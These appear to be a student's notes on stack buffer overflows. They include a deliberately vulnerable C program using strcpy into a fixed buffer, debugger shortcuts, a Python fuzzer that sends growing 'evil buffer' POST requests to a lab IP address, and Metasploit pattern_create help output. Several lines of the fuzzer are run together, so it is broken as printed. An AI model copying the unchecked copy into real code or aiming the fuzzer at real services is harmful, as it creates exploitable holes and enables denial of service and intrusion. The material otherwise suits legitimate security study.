
# Buffer Overflow

Thread Stack Frame Example

Function A Return Address

Function A parameter 1 

Function A parameter 2 

Function A parameter 3 

## Sample Vulnerable Code
```
#include <stdio.h> 
#include <string.h>

int main(int argc, char *argv[])
{	
    char buffer[64];
    if (argc < 2)
    {
        printf("Error - You must supply at least one argument\n");
        return 1; 
    }
    strcpy(buffer, argv[1]);
    return 0; 
}
```
We right click inside the disassembly window and select Search for > All referenced text
strings:

set break point - f2

Run - f9

Step Into - f7

Continue Till Return - Ctrl+f9

## Fuzzing Script:

```
#!/usr/bin/python 
import socket 
import time 
import sys

size = 100

while(size < 2000):
    try:
        print "\nSending evil buffer with %s bytes" % size inputBuffer = "A" * size
        content = "username=" + inputBuffer + "&password=A"
        buffer = "POST /login HTTP/1.1\r\n"
        buffer += "Host: 10.11.0.22\r\n"
        buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101
        Firefox/52.0\r\n" buffer += "Accept:
        text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" buffer += "Accept-Language: en-US,en;q=0.5\r\n"
        buffer += "Referer: http://10.11.0.22/login\r\n"
        buffer += "Connection: close\r\n"
        buffer += "Content-Type: application/x-www-form-urlencoded\r\n" buffer += "Content-Length: "+str(len(content))+"\r\n"
        buffer += "\r\n"
        buffer += content
        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("10.11.0.22", 80)) s.send(buffer)
        s.close()
        size += 100 time.sleep(10)
    except:
        print "\nCould not connect!" sys.exit()
```


```
kali@kali:~$ locate pattern_create
/usr/bin/msf-pattern_create /usr/share/metasploit-framework/tools/exploit/pattern_create.rb

kali@kali:~$ msf-pattern_create -h
Usage: msf-pattern_create [options]
Example: msf-pattern_create -l 50 -s ABC,def,123 Ad1Ad2Ad3Ae1Ae2Ae3Af1Af2Af3Bd1Bd2Bd3Be1Be2Be3Bf1Bf

Options:
-l, --length <length> The length of the pattern
-s, --sets <ABC,def,123> Custom Pattern Sets
-h, --help Show this message
```

